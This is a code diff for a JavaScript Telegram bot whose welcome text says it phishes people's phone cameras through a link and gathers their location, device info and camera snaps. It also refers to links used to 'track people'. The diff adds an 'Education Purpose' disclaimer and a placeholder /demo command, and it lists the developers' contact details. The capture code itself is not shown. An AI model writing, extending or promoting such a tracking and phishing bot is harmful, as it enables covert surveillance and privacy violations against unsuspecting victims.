@@ -71,7 +71,7 @@ if(msg.text=="/start"){
 var m={
 reply_markup:JSON.stringify({"inline_keyboard":[[{text:"Create Link",callback_data:"crenew"}], [{text:"Join Us", url:"https://t.me/kannadagamershub01"}], [{text:"Follow us", url:"http://instagram.com/kannada_gamers_hub"}], [{text:"Contact Us", url:"https://instagram.com/mithun.gowda.b"}]]})
 };
-bot.sendMessage(chatId, `Welcome @${msg.chat.username} ! , \nYou can use this bot to Pishing people's PhoneCamera just through a simple link.\nIt can gather informations like location , device info, camera snaps.\n\nType /help for more info.`,m);
+bot.sendMessage(chatId, `Welcome @${msg.chat.username} ! , \nYou can use this bot to Pishing people's PhoneCamera just through a simple link.\nIt can gather informations like location , device info, camera snaps.\n\nType /help for more info.\n\n Disclaimer:\nThis Bot Only For Education Purpose.\n©️All Rights Reserved.`,m);
 }
 else if(msg.text=="/create"){
 createNew(chatId);
@@ -89,6 +89,10 @@ the url it will send you 2 links which you can use to track people.
 }
 else if(msg.text=="/aboutus"){
 bot.sendMessage(chatId,'Developer :\nName: *MithunGowda.B*Email: mithungowda.b7411@gmail.com\nInstagram: http://instagram.com/mithun.gowda.b\n\nContent :\nName: *Manvanth* (Appu)\nEmail: kannadagamershub@gmail.com\nInstagram: https://www.instagram.com/________star_shadow________ \n\n Publisher :\nName: *Nithin* (Niki)\nInstagram: https://www.instagram.com/_mr_dynamic__');
+}
+
+else if(msg.text=="/demo"){
+bot.sendMessage(chatId,'We will Update it Soon');
 }
   
 });
